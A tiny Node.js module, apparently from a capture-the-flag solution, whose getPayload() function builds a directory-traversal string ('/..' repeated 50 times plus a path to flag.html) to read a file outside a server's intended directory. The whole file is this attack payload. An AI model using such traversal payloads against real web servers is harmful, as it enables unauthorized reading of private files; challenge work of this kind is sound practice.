function getPayload() {
  const path = require('path'); // Import the path module
  return "/..".repeat(50) + path.resolve(__dirname, "../flag.html");
}

module.exports = { getPayload };